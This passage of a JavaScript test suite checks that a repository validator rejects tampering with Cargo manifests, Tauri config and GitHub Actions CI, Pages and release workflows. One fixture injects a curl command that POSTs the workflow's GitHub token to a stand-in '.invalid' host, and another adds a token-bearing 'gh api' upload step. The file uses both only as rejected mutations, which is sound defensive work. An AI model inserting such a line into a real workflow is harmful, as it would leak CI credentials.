test("fake CLI manifest rejects a target-specific dependency subtable", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[target.'cfg(windows)'.dependencies.tempfile]\nversion = "3"\n`,
    );
  });
  assertRejected(
    result,
    /fake CLI dependency surface.*target.*dependencies\.tempfile/i,
  );
});

test("fake CLI manifest rejects a spaced direct dependency dotted key with quoted segments", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[ dependencies . "tempfile" ]\nversion = "3"\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*dependencies.*tempfile/i);
});

test("fake CLI manifest rejects a spaced target dependency dotted key with quoted segments", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[ target . 'cfg(windows)' . dependencies . "tempfile" ]\nversion = "3"\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*target.*dependencies.*tempfile/i);
});

test("fake CLI manifest rejects target features on serde_json through an escaped quoted key", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[ target . "cfg(windows)" . "\\u0064ependencies" . serde_json ]\nfeatures = ["preserve_order"]\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*target.*dependencies.*serde_json/i);
});

test("fake CLI manifest fails closed on a malformed quoted dependency table header", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[ "dependencies" . serde_json trailing ]\nfeatures = ["preserve_order"]\n`,
    );
  });
  assertRejected(result, /fake CLI manifest.*invalid TOML table header/i);
});

test("fake CLI manifest fails closed on an unterminated literal dependency table key", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[ 'dependencies . serde_json ]\nfeatures = ["preserve_order"]\n`,
    );
  });
  assertRejected(result, /fake CLI manifest.*invalid TOML table header/i);
});

test("fake CLI manifest rejects a root target dotted assignment that adds serde_json features", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `target . 'cfg(windows)' . dependencies . serde_json = { version = "1", features = ["raw_value"] }\n${source}`,
    );
  });
  assertRejected(
    result,
    /tools\/fake-cli\/Cargo\.toml.*normalized source seal mismatch/i,
  );
});

test("fake CLI manifest rejects a spaced root build dependency with quoted segments", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `"build-dependencies" . "serde_json" = { version = "1", features = ["raw_value"] }\n${source}`,
    );
  });
  assertRejected(
    result,
    /tools\/fake-cli\/Cargo\.toml.*normalized source seal mismatch/i,
  );
});

test("fake CLI manifest rejects a root dev dependency with literal quoted segments", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `'dev-dependencies' . 'serde_json' = { version = "1", default-features = false }\n${source}`,
    );
  });
  assertRejected(
    result,
    /tools\/fake-cli\/Cargo\.toml.*normalized source seal mismatch/i,
  );
});

test("fake CLI manifest source seal normalizes CRLF to LF", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      source.replace(/\r\n?/g, "\n").replace(/\n/g, "\r\n"),
    );
  });
  assert.equal(
    result.status,
    0,
    `line-ending-only fixture unexpectedly failed:\n${result.stdout}\n${result.stderr}`,
  );
});

test("fake CLI manifest does not classify package metadata as a Cargo dependency table", () => {
  const result = runNegativeFixture(
    (fixture) => {
      replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
        `${source}\n[package.metadata.dependencies]\nowner = "fixture-only"\n`,
      );
      syncFakeManifestSeal(fixture);
    },
    { fixtureValidator: true },
  );
  assert.equal(
    result.status,
    0,
    `metadata fixture unexpectedly failed:\n${result.stdout}\n${result.stderr}`,
  );
});

test("fake CLI manifest parser accepts a valid array-of-tables header", () => {
  const result = runNegativeFixture(
    (fixture) => {
      replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
        `${source}\n[[bin]]\nname = "fixture-bin"\npath = "src/main.rs"\n`,
      );
      syncFakeManifestSeal(fixture);
    },
    { fixtureValidator: true },
  );
  assert.equal(
    result.status,
    0,
    `array-table fixture unexpectedly failed:\n${result.stdout}\n${result.stderr}`,
  );
});

test("fake CLI lock entry rejects a final dependency without a trailing comma", () => {
  const result = runNegativeFixture((fixture) => {
    const lockPath = join(fixture, "Cargo.lock");
    replace(lockPath, (source) =>
      source.replace(
        'name = "ability-radar-fake-cli"\nversion = "0.1.0"\ndependencies = [\n "serde_json",\n]',
        'name = "ability-radar-fake-cli"\nversion = "0.1.0"\ndependencies = [\n "serde_json",\n "tempfile"\n]',
      ),
    );
    const normalizedLock = readFileSync(lockPath, "utf8").replace(
      /\r\n?/g,
      "\n",
    );
    const lockHash = createHash("sha256")
      .update(normalizedLock, "utf8")
      .digest("hex");
    replace(
      join(fixture, "docs", "licenses", "rust-dependencies.json"),
      (source) => {
        const report = JSON.parse(source);
        report.lockfileSha256 = lockHash;
        return `${JSON.stringify(report, null, 2)}\n`;
      },
    );
  });
  assertRejected(result, /Cargo\.lock.*fake CLI.*dependencies.*serde_json/i);
});

test("fake CLI cannot become a bundled Tauri resource", () => {
  const result = runNegativeFixture((fixture) => {
    replace(
      join(fixture, "apps", "desktop", "src-tauri", "tauri.conf.json"),
      (source) =>
        source.replace(
          '"../../../benchmark-packs/": "benchmark-packs/"',
          '"../../../benchmark-packs/": "benchmark-packs/",\n      "../../../tools/fake-cli/": "fake-cli/"',
        ),
    );
  });
  assertRejected(result, /fake CLI.*(?:bundle|resource)/i);
});

test("CI must build and install only the first-party fake before the opted-in E2E", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        /      - name: Install deterministic fake CLIs[\s\S]*?(?=      - name: Test frontend)/,
        "",
      )
    );
  });
  assertRejected(result, /fake CLI|ABILITY_RADAR_FAKE_CLI_E2E/i);
});

test("fake CLI install must be immediately before its E2E step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) => {
      const match = source.match(
        /(      - name: Install deterministic fake CLIs[\s\S]*?)(      - name: Test real coordinator with deterministic fake CLIs[\s\S]*?)(?=      - name: Test frontend)/,
      );
      assert.ok(match, "fixture needs adjacent fake install and E2E steps");
      return source.replace(match[0], `${match[2]}${match[1]}`);
    });
  });
  assertRejected(result, /install.*immediately before.*E2E/i);
});

test("fake CLI build command cannot move to another CI step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source
        .replace("          cargo build -p ability-radar-fake-cli --locked\n", "")
        .replace(
          "      - name: Test frontend\n        run: npm test",
          "      - name: Test frontend\n        run: |\n          cargo build -p ability-radar-fake-cli --locked\n          npm test",
        ),
    );
  });
  assertRejected(result, /Install deterministic fake CLIs.*exact/i);
});

test("fake CLI E2E command cannot move to another CI step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source
        .replace(
          "        run: cargo test -p ability-radar --test fake_cli_e2e --locked -- --ignored",
          "        run: Write-Output \"E2E moved\"",
        )
        .replace(
          "      - name: Test frontend\n        run: npm test",
          "      - name: Test frontend\n        run: |\n          cargo test -p ability-radar --test fake_cli_e2e --locked -- --ignored\n          npm test",
        ),
    );
  });
  assertRejected(result, /Test real coordinator.*exact/i);
});

test("fake CLI E2E opt-in cannot be owned by another CI step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source
        .replace(
          "      - name: Test real coordinator with deterministic fake CLIs\n        env:\n          ABILITY_RADAR_FAKE_CLI_E2E: \"1\"",
          "      - name: Test real coordinator with deterministic fake CLIs",
        )
        .replace(
          "      - name: Test frontend\n        run: npm test",
          "      - name: Test frontend\n        env:\n          ABILITY_RADAR_FAKE_CLI_E2E: \"1\"\n        run: npm test",
        ),
    );
  });
  assertRejected(result, /fake CLI E2E.*(?:opt in|environment)/i);
});

test("fake CLI commands and opt-in cannot be duplicated in another CI step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "      - name: Test frontend\n        run: npm test",
        "      - name: Test frontend\n        env:\n          ABILITY_RADAR_FAKE_CLI_E2E: \"1\"\n        run: |\n          cargo test -p ability-radar --test fake_cli_e2e --locked -- --ignored\n          npm test",
      ),
    );
  });
  assertRejected(result, /fake CLI commands.*only.*named/i);
});

test("fake CLI install step rejects conditional bypass controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "      - name: Install deterministic fake CLIs\n        run:",
        "      - name: Install deterministic fake CLIs\n        if: false\n        run:",
      ),
    );
  });
  assertRejected(result, /Install deterministic fake CLIs.*fields|control/i);
});

test("fake CLI E2E step rejects continue-on-error bypass controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        '          ABILITY_RADAR_FAKE_CLI_E2E: "1"\n        run:',
        '          ABILITY_RADAR_FAKE_CLI_E2E: "1"\n        continue-on-error: true\n        run:',
      ),
    );
  });
  assertRejected(result, /Test real coordinator.*fields|control/i);
});

test("CI job rejects conditional bypass controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "    timeout-minutes: 60",
        "    timeout-minutes: 60\n    if: false",
      ),
    );
  });
  assertRejected(result, /CI job.*fields|control/i);
});

test("CI job cannot own the fake CLI E2E opt-in", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "    timeout-minutes: 60",
        '    timeout-minutes: 60\n    env:\n      ABILITY_RADAR_FAKE_CLI_E2E: "1"',
      ),
    );
  });
  assertRejected(result, /CI job.*fake CLI E2E opt-in|environment/i);
});

test("CI workflow cannot own the fake CLI E2E opt-in", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "jobs:",
        'env:\n  ABILITY_RADAR_FAKE_CLI_E2E: "1"\n\njobs:',
      ),
    );
  });
  assertRejected(result, /CI workflow.*fake CLI E2E opt-in|environment/i);
});

test("CI workflow rejects flow-style environment declarations", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "jobs:",
        'env: { ABILITY_RADAR_FAKE_CLI_E2E: "1" }\n\njobs:',
      ),
    );
  });
  assertRejected(result, /CI workflow.*env.*declaration|environment/i);
});

test("CI job rejects flow-style environment declarations", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "    timeout-minutes: 60",
        '    timeout-minutes: 60\n    env: { ABILITY_RADAR_FAKE_CLI_E2E: "1" }',
      ),
    );
  });
  assertRejected(result, /CI job.*env.*declaration|environment/i);
});

test("fake CLI E2E environment rejects merge syntax", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        '        env:\n          ABILITY_RADAR_FAKE_CLI_E2E: "1"',
        '        env:\n          <<: *fake_env\n          ABILITY_RADAR_FAKE_CLI_E2E: "1"',
      ),
    );
  });
  assertRejected(result, /fake CLI E2E environment.*exact|unsupported.*env/i);
});

test("Pages upload artifact path is an exact allowlist", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace("          path: _site", "          path: ."),
    );
  });
  assertRejected(result, /Pages artifact.*_site/i);
});

test("Pages site assembly commands belong only to the named assembly step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source
        .replace(
          "          cp docs/privacy.md _site/docs/privacy.md\n",
          "",
        )
        .replace(
          "      - name: Validate repository contracts\n        run: node scripts/validate-repository.mjs",
          "      - name: Validate repository contracts\n        run: |\n          node scripts/validate-repository.mjs\n          cp docs/privacy.md _site/docs/privacy.md",
        ),
    );
  });
  assertRejected(result, /Assemble static site.*exact/i);
});

test("Pages workflow rejects an extra approved action from another workflow", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "      - name: Validate repository contracts",
        "      - name: Extra generic artifact upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7\n        with:\n          name: broad-pages-copy\n          path: .\n      - name: Validate repository contracts",
      ),
    );
  });
  assertRejected(result, /Pages.*action sequence.*exact|approved action/i);
});

test("CI workflow rejects an extra approved Pages upload action", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "      - name: Test frontend",
        "      - name: Extra Pages upload\n        uses: actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9 # v5\n        with:\n          path: .\n      - name: Test frontend",
      ),
    );
  });
  assertRejected(result, /CI.*action sequence.*exact|approved action/i);
});

test("Pages rejects alternate non-assembly writes into _site", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "      - name: Validate repository contracts\n        run: node scripts/validate-repository.mjs",
        "      - name: Validate repository contracts\n        run: |\n          node scripts/validate-repository.mjs\n          node -e \"require('node:fs').writeFileSync('_site/extra', 'x')\"",
      ),
    );
  });
  assertRejected(result, /Pages.*step sequence.*exact|non-assembly.*_site/i);
});

test("Pages workflow rejects an extra non-publication step", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "      - name: Upload Pages artifact",
        "      - name: Unexpected diagnostic\n        run: node --version\n      - name: Upload Pages artifact",
      ),
    );
  });
  assertRejected(result, /Pages.*step sequence.*exact/i);
});

test("Pages upload owner rejects conditional bypass controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "      - name: Upload Pages artifact\n        uses:",
        "      - name: Upload Pages artifact\n        if: false\n        uses:",
      ),
    );
  });
  assertRejected(result, /Upload Pages artifact.*fields|control/i);
});

test("Pages checkout rejects ref input drift", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "          persist-credentials: false",
        "          persist-credentials: false\n          ref: main",
      ),
    );
  });
  assertRejected(result, /Pages checkout.*input|persist-credentials.*exact/i);
});

test("Pages checkout rejects path input drift", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "          persist-credentials: false",
        "          persist-credentials: false\n          path: source",
      ),
    );
  });
  assertRejected(result, /Pages checkout.*input|persist-credentials.*exact/i);
});

test("Pages configure action rejects extra inputs", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "        uses: actions/configure-pages@983d7736d9b0ae728b81ab479565c72886d7745b # v5",
        "        uses: actions/configure-pages@983d7736d9b0ae728b81ab479565c72886d7745b # v5\n        with:\n          static_site_generator: next",
      ),
    );
  });
  assertRejected(result, /Configure Pages.*input|contract.*exact/i);
});

test("Pages deploy action rejects control drift", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "      - name: Deploy\n        id:",
        "      - name: Deploy\n        continue-on-error: true\n        id:",
      ),
    );
  });
  assertRejected(result, /Deploy Pages owner.*fields|control/i);
});

test("Pages deploy action rejects input drift", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "        uses: actions/deploy-pages@cd2ce8fcbc39b97be8ca5fce6e763baed58fa128 # v5",
        "        uses: actions/deploy-pages@cd2ce8fcbc39b97be8ca5fce6e763baed58fa128 # v5\n        with:\n          preview: true",
      ),
    );
  });
  assertRejected(result, /Deploy Pages.*input|contract.*exact/i);
});

test("Pages workflow rejects trigger broadening through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "  workflow_dispatch:",
        "  workflow_dispatch:\n  pull_request:",
      ),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Pages workflow rejects a top-level environment through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace("jobs:", "env:\n  PAGES_DRIFT: \"1\"\n\njobs:"),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Pages build job rejects runner drift through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace("    runs-on: ubuntu-latest", "    runs-on: windows-latest"),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Pages build job rejects timeout drift through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace("    timeout-minutes: 10", "    timeout-minutes: 11"),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Pages build job rejects environment drift through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "    timeout-minutes: 10",
        "    timeout-minutes: 10\n    env:\n      PAGES_DRIFT: \"1\"",
      ),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Pages deploy job rejects needs drift through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace("    needs: build", "    needs: [build]"),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Pages deploy job rejects nested environment drift through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace("      name: github-pages", "      name: production"),
    );
  });
  assertRejected(result, /pages\.yml.*normalized source seal mismatch/i);
});

test("Tauri release action rejects extra input fields", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "          uploadUpdaterSignatures: false",
        "          uploadUpdaterSignatures: false\n          extraUploadSource: target/release",
      ),
    );
  });
  assertRejected(result, /Tauri release.*input.*allowlist/i);
});

test("Tauri release owner rejects continue-on-error controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "      - name: Build unsigned draft prerelease\n        id: tauri",
        "      - name: Build unsigned draft prerelease\n        continue-on-error: true\n        id: tauri",
      ),
    );
  });
  assertRejected(result, /Tauri release.*fields|control/i);
});

test("Tauri resource allowlist rejects unrelated bundle roots", () => {
  const result = runNegativeFixture((fixture) => {
    replace(
      join(fixture, "apps", "desktop", "src-tauri", "tauri.conf.json"),
      (source) =>
        source.replace(
          '"../../../benchmark-packs/": "benchmark-packs/"',
          '"../../../benchmark-packs/": "benchmark-packs/",\n      "../../../extra/": "extra/"',
        ),
    );
  });
  assertRejected(result, /Tauri resource allowlist/i);
});

test("Tauri release bundle targets are exactly NSIS and MSI", () => {
  const result = runNegativeFixture((fixture) => {
    replace(
      join(fixture, "apps", "desktop", "src-tauri", "tauri.conf.json"),
      (source) =>
        source.replace(
          '"targets": ["nsis", "msi"]',
          '"targets": ["nsis", "msi", "updater"]',
        ),
    );
  });
  assertRejected(result, /Tauri bundle targets.*NSIS.*MSI/i);
});

test("release checksum set rejects a missing expected portable ZIP", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) => {
      const changed = source.replace(
        '            "target/release/bundle/portable/ability-radar_${version}_windows-x64-portable.zip"\n',
        "",
      );
      assert.notEqual(changed, source, "missing portable mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /Generate SHA-256 checksums.*exact|normalized source seal/i);
});

test("release checksums own exactly three ordered versioned assets", () => {
  const source = readFileSync(
    join(root, ".github", "workflows", "release.yml"),
    "utf8",
  );
  const checksumStep = source.slice(
    source.indexOf("      - name: Generate SHA-256 checksums"),
    source.indexOf(
      "      - name: Upload portable archive and checksums to the draft prerelease",
    ),
  );

  assert.match(checksumStep, /\$version = \$env:RELEASE_TAG\.Substring\(1\)/);
  const expectedPaths = [
    "target/release/bundle/nsis/ability-radar_${version}_x64-setup.exe",
    "target/release/bundle/msi/ability-radar_${version}_x64_en-US.msi",
    "target/release/bundle/portable/ability-radar_${version}_windows-x64-portable.zip",
  ];
  let cursor = -1;
  for (const path of expectedPaths) {
    const next = checksumStep.indexOf(`"${path}"`);
    assert.ok(next > cursor, `${path} must appear once and in release order`);
    assert.equal(checksumStep.indexOf(`"${path}"`, next + 1), -1);
    cursor = next;
  }
  assert.match(checksumStep, /Select-Object -Unique/);
  assert.match(checksumStep, /-ne 3/);
  assert.match(checksumStep, /unexpected/i);
  assert.match(checksumStep, /Test-Path -LiteralPath \$path -PathType Leaf/);
  assert.match(checksumStep, /Get-FileHash -Algorithm SHA256 -LiteralPath \$path/);
});

for (const [label, mutate] of [
  [
    "unexpected extra asset",
    (source) => source.replace(
      "          $leafNames = @($expected | ForEach-Object { Split-Path -Leaf $_ })",
      '          $expected += "target/release/bundle/stale/ability-radar_${version}_old.zip"\n          $leafNames = @($expected | ForEach-Object { Split-Path -Leaf $_ })',
    ),
  ],
  [
    "broad recursive checksum input",
    (source) => source.replace(
      "          $lines = foreach ($path in $expected) {",
      "          $lines = foreach ($path in (Get-ChildItem -LiteralPath $bundleRoot -Recurse -File)) {",
    ),
  ],
  [
    "wrong fixed version",
    (source) => source.replace(
      "ability-radar_${version}_x64_en-US.msi",
      "ability-radar_0.2.0_x64_en-US.msi",
    ),
  ],
  [
    "wrong checksum order",
    (source) => source
      .replace(
        '            "target/release/bundle/nsis/ability-radar_${version}_x64-setup.exe"',
        '            "__NSIS__"',
      )
      .replace(
        '            "target/release/bundle/msi/ability-radar_${version}_x64_en-US.msi"',
        '            "target/release/bundle/nsis/ability-radar_${version}_x64-setup.exe"',
      )
      .replace(
        '            "__NSIS__"',
        '            "target/release/bundle/msi/ability-radar_${version}_x64_en-US.msi"',
      ),
  ],
  [
    "duplicate leaf name guard removal",
    (source) => source.replace(
      "($leafNames | Select-Object -Unique).Count -ne 3",
      "$leafNames.Count -ne 3",
    ),
  ],
]) {
  test(`release checksum contract rejects ${label}`, () => {
    const result = runNegativeFixture((fixture) => {
      replace(join(fixture, ".github", "workflows", "release.yml"), (source) => {
        const changed = mutate(source);
        assert.notEqual(changed, source, `${label} mutation must change the fixture`);
        return changed;
      });
    });
    assertRejected(result, /Generate SHA-256 checksums.*exact|normalized source seal/i);
  });
}

for (const [label, uploadSource] of [
  ["wildcard", '"target/release/bundle/*"'],
  ["raw target directory", "target/release"],
]) {
  test(`portable archive upload rejects a ${label} source`, () => {
    const result = runNegativeFixture((fixture) => {
      replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
        source.replace(
          "$portable SHA256SUMS.txt --clobber",
          `${uploadSource} SHA256SUMS.txt --clobber`,
        ));
    });
    assertRejected(
      result,
      /portable archive.*upload.*exact|release step sequence.*exact/i,
    );
  });
}

test("portable archive build must follow the Tauri draft release", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) => {
      const portable =
        "      - name: Build portable archive from reviewed release output\n        run: npm run package:portable:from-build\n";
      return source.includes(portable)
        ? source
            .replace(portable, "")
            .replace("      - name: Build unsigned draft prerelease\n", `${portable}      - name: Build unsigned draft prerelease\n`)
        : source;
    });
  });
  assertRejected(result, /release step sequence.*exact|portable.*after.*Tauri/i);
});

test("uploaded portable ZIP filename must derive from the manifest version", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        '$portable = "target/release/bundle/portable/ability-radar_${version}_windows-x64-portable.zip"',
        '$portable = "target/release/bundle/portable/ability-radar_0.2.0_windows-x64-portable.zip"',
      ));
  });
  assertRejected(
    result,
    /portable archive.*upload.*exact|manifest version|release step sequence.*exact/i,
  );
});

test("checksum upload step rejects an extra release upload source", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "          gh release upload $env:RELEASE_TAG $portable SHA256SUMS.txt --clobber",
        "          gh release upload $env:RELEASE_TAG $portable SHA256SUMS.txt --clobber\n          gh release upload $env:RELEASE_TAG target/release/ability-radar.exe --clobber",
      ),
    );
  });
  assertRejected(
    result,
    /checksum.*upload.*exact|extra release upload|release step sequence.*exact/i,
  );
});

test("prefixed gh release upload cannot escape checksum ownership", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      `${source}\n      - name: Prefixed broad release upload\n        shell: pwsh\n        run: \"& gh release upload $env:RELEASE_TAG target/release/ability-radar.exe --clobber\"\n`,
    );
  });
  assertRejected(
    result,
    /checksum.*upload.*exact|extra release upload|release step sequence.*exact/i,
  );
});

test("checksum upload owner rejects conditional bypass controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "      - name: Upload portable archive and checksums to the draft prerelease\n        shell:",
        "      - name: Upload portable archive and checksums to the draft prerelease\n        if: false\n        shell:",
      ),
    );
  });
  assertRejected(result, /checksum.*fields|control/i);
});

test("release workflow rejects an extra approved broad artifact upload", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      `${source}\n      - name: Broad release artifact upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7\n        with:\n          name: broad-release-copy\n          path: target/release\n`,
    );
  });
  assertRejected(result, /release.*action sequence.*exact|approved action/i);
});

test("release workflow rejects an extra gh api upload step with token ownership", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "      - name: Upload portable archive and checksums to the draft prerelease",
        "      - name: Alternate API upload\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: gh api repos/${{ github.repository }}/releases\n      - name: Upload portable archive and checksums to the draft prerelease",
      ),
    );
  });
  assertRejected(result, /release.*step sequence.*exact|Alternate API upload/i);
});

test("release workflow rejects an appended alternate upload command", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "      - name: Install frontend dependencies\n        run: npm ci",
        "      - name: Install frontend dependencies\n        run: |\n          npm ci\n          curl.exe -X POST https://api.github.invalid/upload -H \"Authorization: Bearer ${{ github.token }}\"",
      ),
    );
  });
  assertRejected(result, /Install frontend dependencies.*exact|release step.*contract/i);
});

test("release job rejects conditional controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "    timeout-minutes: 60",
        "    timeout-minutes: 60\n    if: false",
      ),
    );
  });
  assertRejected(result, /release job.*fields|control/i);
});

test("release job rejects continue-on-error controls", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "    timeout-minutes: 60",
        "    timeout-minutes: 60\n    continue-on-error: true",
      ),
    );
  });
  assertRejected(result, /release job.*fields|control/i);
});

test("release checkout rejects ref input drift", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace(
        "          fetch-depth: 0",
        "          fetch-depth: 0\n          ref: main",
      ),
    );
  });
  assertRejected(result, /release checkout.*input|contract.*exact/i);
});

test("release workflow rejects trigger broadening through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace("on:\n  push:", "on:\n  workflow_dispatch:\n  push:"),
    );
  });
  assertRejected(result, /release\.yml.*normalized source seal mismatch/i);
});

test("release workflow rejects a top-level environment through its source seal", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
      source.replace("jobs:", "env:\n  RELEASE_DRIFT: \"1\"\n\njobs:"),
    );
  });
  assertRejected(result, /release\.yml.*normalized source seal mismatch/i);
});

test("CI installer upload rejects extra artifact inputs", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "          retention-days: 7",
        "          retention-days: 7\n          include-hidden-files: true",
      ),
    );
  });
  assertRejected(result, /CI artifact.*input allowlist/i);
});

test("CI installer upload owner rejects continue-on-error controls", () => {
  const result = runNegativeFixture((fixture) => {
